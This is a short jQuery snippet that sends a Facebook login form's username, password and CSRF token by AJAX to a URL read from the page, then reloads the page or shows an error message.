$('.facebook').on('click', function(){
    var formData = new FormData();
    login = $('#login').val();
    formData.append('login', login);
    password = $('#password').val();
    formData.append('password', password);
    csrf_token =  $('input[name="csrf_token"]').attr('value');
    formData.append('csrfmiddlewaretoken', csrf_token);
    console.log(formData);
    postUrl = $('#url_facebook').val();
    console.log(postUrl);
    $.post({url: postUrl,
            dataType: "json",
            data:formData,
            processData:false,
            contentType: false,
        }).done(function(result) {
                if (result._code == 0 ){
                    location.reload();
                    }
                else{
                    $('.telegram').text("Error! Click again")
                    }
        });
});
